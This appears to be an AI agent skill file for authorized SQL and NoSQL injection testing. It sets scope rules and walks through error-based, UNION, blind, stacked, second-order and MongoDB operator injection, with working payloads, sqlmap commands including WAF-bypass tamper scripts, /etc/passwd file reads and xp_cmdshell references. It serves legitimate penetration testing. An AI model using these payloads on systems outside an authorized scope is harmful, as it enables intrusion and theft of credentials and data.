---
name: sqli-hunter
description: "Invoke this skill when the task requires testing for SQL injection or NoSQL injection vulnerabilities in a web application under authorized engagement: error-based, blind (boolean and time-based), UNION-based, stacked queries, second-order, out-of-band, and NoSQL operator injection. Covers manual crafting and sqlmap automation, with mandatory proof-of-extraction verification."
---

# SQL Injection & NoSQL Injection Testing

This skill covers the full lifecycle of injection testing against relational and document databases under an **authorized** engagement. A finding is not confirmed until actual data has been extracted or a verifiable side-channel has been demonstrated; error messages and anomalous behavior alone are leads, not findings.

## Boundaries

| Allowed | Prohibited |
|---|---|
| Testing parameters, headers, and cookies within authorized scope | Testing targets outside the written scope |
| Extracting proof rows from test/dummy data or schema metadata | Mass exfiltration of production user data |
| Using `SLEEP()` / `WAITFOR DELAY` / `pg_sleep()` with short delays (1-5s) | Delays exceeding 10 seconds or repeated heavy time-based payloads that degrade service |
| Reading database version, current user, table names as proof | Writing, updating, or deleting any production data |
| Stacked queries for read-only proof (e.g., `SELECT version()`) | Stacked queries that modify data (`DROP`, `INSERT`, `UPDATE`, `DELETE` on production tables) |
| Using `INTO OUTFILE` / `LOAD_FILE` only in lab environments | File-system writes on production targets |
| OS command execution proof (`xp_cmdshell`, UDF) only with explicit engagement approval | Persistent backdoors, reverse shells left running, or lateral movement without approval |
| NoSQL operator injection against authorized endpoints | Denial-of-service via regex or aggregation abuse |

## Phase 0: Pre-engagement setup

1. Confirm the target application and specific endpoints are within the authorized scope document.
2. Identify the technology stack: server language, framework, database engine (MySQL, PostgreSQL, MSSQL, Oracle, SQLite, MongoDB, CouchDB).
3. Set up a local proxy (Burp, mitmproxy, or browser dev tools) to capture and replay requests.
4. Prepare a working directory for artifacts: `mkdir -p work/sqli-hunter/{requests,responses,proofs}`.
5. If sqlmap will be used, verify it is installed and functional: `sqlmap --version`.

## Phase 1: Injection point enumeration

Systematically map every input vector that reaches a query layer.

### 1.1 Parameter discovery

- [ ] GET query parameters (URL params).
- [ ] POST body parameters (form-encoded, JSON, XML, multipart).
- [ ] URL path segments (RESTful IDs: `/users/42/profile`).
- [ ] HTTP headers that may reach queries: `Cookie`, `Referer`, `User-Agent`, `X-Forwarded-For`, custom headers.
- [ ] JSON/XML nested fields and arrays (e.g., `{"filter": {"id": "1"}}`).

### 1.2 Behavioral fingerprinting

For each candidate parameter, inject a baseline pair to detect query interaction:

```
Original:  id=1
Arithmetic: id=2-1       (should return same result if evaluated in SQL)
String:    name=test      vs  name=te'+'st  (MSSQL concat)
                          vs  name=te''st   (escaped quote behavior)
```

Record the response length, status code, and body hash for each. A diff between `id=1` and `id=1'` (single quote) is a lead. A match between `id=1` and `id=2-1` is a stronger signal.

### 1.3 Database type classification

| Signal | Likely DB |
|---|---|
| `You have an error in your SQL syntax` | MySQL |
| `unterminated quoted string` / `PG::SyntaxError` | PostgreSQL |
| `Unclosed quotation mark` / `Incorrect syntax near` | MSSQL |
| `ORA-00933` / `ORA-01756` | Oracle |
| `SQLITE_ERROR` / `near "..."` | SQLite |
| `$gt`, `$ne` operators accepted in JSON | MongoDB |
| Stack traces mentioning Mongoose, pymongo, Mongoid | MongoDB |

## Phase 2: Error-based injection

Goal: force the database to include data in error messages.

### 2.1 MySQL

```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))-- -
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1)-- -
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)-- -
```

### 2.2 PostgreSQL

```sql
' AND 1=CAST((SELECT version()) AS INT)-- -
' AND 1=(SELECT CASE WHEN 1=1 THEN CAST(version() AS INT) ELSE 1 END)-- -
```

### 2.3 MSSQL

```sql
' AND 1=CONVERT(INT, (SELECT @@version))-- -
' AND 1=(SELECT TOP 1 CAST(name AS INT) FROM sysdatabases)-- -
```

### 2.4 Oracle

```sql
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))-- -
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- -
```

Record: exact request, exact error message containing extracted data, DB type confirmed.

## Phase 3: UNION-based injection

### 3.1 Column count determination

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
...                      (increment until error)
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
...                      (increment NULLs until success)
```

### 3.2 Output column identification

Replace each NULL with a string marker to find which columns render in the response:

```sql
' UNION SELECT 'col1','col2','col3',NULL,NULL-- -
```

### 3.3 Data extraction

Once a visible column is identified:

```sql
' UNION SELECT version(),NULL,NULL-- -
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1-- -
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users' LIMIT 0,1-- -
' UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users LIMIT 0,1-- -
```

Proof: screenshot or saved response showing the extracted row.

## Phase 4: Blind injection (boolean-based)

When no data appears in responses but behavior differs on TRUE/FALSE conditions.

### 4.1 Condition verification

```sql
' AND 1=1-- -    (TRUE  -> normal response)
' AND 1=2-- -    (FALSE -> different response)
```

### 4.2 Character-by-character extraction

```sql
' AND SUBSTRING((SELECT version()),1,1)='5'-- -
' AND ASCII(SUBSTRING((SELECT user()),1,1))>96-- -
```

Binary search the ASCII range (32-126) for each character position. Automate with sqlmap or a custom script; manual extraction of 3-5 characters is sufficient proof, then switch to tooling.

### 4.3 Proof artifact

Log the sequence of boolean responses that reconstruct a known value (e.g., the first 8 characters of `@@version`).

## Phase 5: Blind injection (time-based)

When boolean differences are not observable in the response body or status code.

### 5.1 Baseline timing

Measure 5 normal requests to establish a response-time baseline (mean and standard deviation).

### 5.2 Conditional delay injection

```sql
MySQL:    ' AND IF(1=1, SLEEP(3), 0)-- -
Postgres: ' AND (SELECT CASE WHEN 1=1 THEN pg_sleep(3) ELSE pg_sleep(0) END)-- -
MSSQL:    '; WAITFOR DELAY '0:0:3'-- -
Oracle:   ' AND 1=(SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',3) ELSE 1 END FROM dual)-- -
```

### 5.3 Verification protocol

- TRUE condition must produce a delay of `baseline + injected_delay (+/- 1s)`.
- FALSE condition must return within `baseline (+/- 1s)`.
- Run each condition **three times** to rule out network jitter.
- Keep delays at 3-5 seconds maximum.

## Phase 6: Stacked queries

Test only after confirming DB type. Stacked queries require specific driver support (common in MSSQL via `; `, sometimes PHP+MySQL with `mysqli_multi_query`).

```sql
MSSQL:    '; SELECT @@version-- -
MySQL:    '; SELECT SLEEP(3)-- -  (verify multi-query support)
```

For proof, use a read-only second query. Never use `INSERT`, `UPDATE`, or `DROP` on production.

## Phase 7: Second-order injection

Data stored in one request is used unsanitized in a later query.

### 7.1 Identification

1. Register a user or create a record with a payload as a field value: `admin'-- -` as a username.
2. Trigger a different functionality that reads that stored value and uses it in a query (e.g., password reset, profile view, admin panel listing).
3. Observe whether the stored payload executes in the second context.

### 7.2 Common second-order vectors

- [ ] User registration -> profile display or admin user listing.
- [ ] Comment submission -> comment moderation panel.
- [ ] Address/billing fields -> order processing or export.
- [ ] Log entries -> log viewer or analytics dashboard.

## Phase 8: NoSQL injection

### 8.1 MongoDB operator injection

```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$ne": "nonexistent"}, "password": {"$ne": "nonexistent"}}
{"username": {"$regex": "^admin"}, "password": {"$gt": ""}}
```

### 8.2 JavaScript injection (server-side)

```json
{"$where": "this.username == 'admin' && sleep(3000)"}
{"$where": "function() { return this.password.match(/^a/) }"}
```

### 8.3 NoSQL-specific proof

Extract at least one record or demonstrate boolean/time differentiation equivalent to relational blind techniques. Regex-based extraction character by character counts as proof.

## Phase 9: sqlmap automation

After manual identification of a likely injection point, accelerate with sqlmap.

### 9.1 Basic invocation

```bash
# From a saved request file
sqlmap -r request.txt --batch --level=3 --risk=2 --threads=4

# Direct URL
sqlmap -u "https://target/page?id=1" --batch --dbs

# POST data
sqlmap -u "https://target/login" --data="user=test&pass=test" -p user --batch
```

### 9.2 Targeted extraction

```bash
sqlmap -r request.txt --batch -D database_name --tables
sqlmap -r request.txt --batch -D database_name -T users --columns
sqlmap -r request.txt --batch -D database_name -T users -C username,password --dump --limit=3
```

### 9.3 Tamper scripts for WAF bypass

```bash
sqlmap -r request.txt --batch --tamper=space2comment,between,randomcase
sqlmap -r request.txt --batch --tamper=charencode,greatest
```

### 9.4 sqlmap output handling

- Save the full sqlmap session: `--output-dir=work/sqli-hunter/sqlmap-out`.
- Extract the confirmed technique and payload from the log.
- Reproduce the winning payload manually with curl to create a standalone proof.

## Phase 10: Impact assessment

For each confirmed injection:

1. **Data access scope**: what tables and columns are reachable? Count of accessible rows (do not dump all).
2. **Privilege level**: `SELECT user()`, `SELECT current_user`, `SHOW GRANTS` -- is the DB user admin or restricted?
3. **Cross-database access**: can other databases on the same server be queried?
4. **File system access** (lab only or with explicit approval): `LOAD_FILE('/etc/passwd')`, `INTO OUTFILE`.
5. **OS command execution** (with explicit approval only): `xp_cmdshell` (MSSQL), UDF (MySQL).

## Verification requirements

A finding is **confirmed** only when ALL of the following are met:

1. **Extracted data proof**: at least one concrete value (DB version, username, table name, or row content) has been retrieved through the injection, not merely inferred from an error.
2. **Replayable artifact**: a curl command, HTTP request file, or sqlmap command line that reproduces the extraction from scratch.
3. **Technique classification**: the specific injection type (error-based, UNION, blind boolean, blind time, stacked, second-order, NoSQL) is named and justified.
4. **DB type confirmed**: the database engine and version are established through extracted data, not guessed from error patterns alone.
5. **False-positive exclusion**: for blind techniques, at least three TRUE/FALSE pairs are logged to rule out coincidence.

## Output format

```markdown
## SQLi Finding: [endpoint] - [parameter]

**Severity**: Critical / High / Medium
**Injection type**: Error-based / UNION / Blind boolean / Blind time / Stacked / Second-order / NoSQL
**Database**: MySQL 8.0.32 / PostgreSQL 15.2 / etc.
**DB user**: app_user@localhost (privileges: SELECT, INSERT on app_db)

### Injection point
- **URL**: https://target/api/users?id=1
- **Parameter**: id (GET)
- **Payload**: `1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -`

### Proof of extraction
- **Extracted value**: `5.7.42-log` (database version)
- **Additional data**: table `users` (columns: id, username, password_hash, email)
- **Sample row**: `admin:$2b$12:REDACTED` (first 12 chars of hash shown as proof)

### Replayable request
\```bash
curl -s 'https://target/api/users?id=1%27%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,(SELECT%20version()),0x7e))--+-' \
  -H 'Cookie: session=TOKEN' | jq .
\```

### Impact
- Read access to entire `app_db` database (14 tables).
- DB user has no FILE or SUPER privilege; OS access not possible.
- Cross-database access: denied (tested with `information_schema.schemata` enumeration).

### Remediation
- Use parameterized queries / prepared statements for the `id` parameter.
- Apply least-privilege to the database user (restrict to required tables only).
```

## Completion self-check

- [ ] Every tested parameter has a logged result (vulnerable, not vulnerable, or inconclusive with reason).
- [ ] Every confirmed finding includes extracted data, not just error anomalies.
- [ ] Every finding has a standalone replayable curl command or request file.
- [ ] sqlmap output (if used) is saved and the winning payload is reproduced manually.
- [ ] No production data was modified; extraction was limited to proof rows.
- [ ] Time-based findings include timing logs showing the three-repetition verification.
- [ ] NoSQL findings (if applicable) include the operator or JS payload and the extracted record.
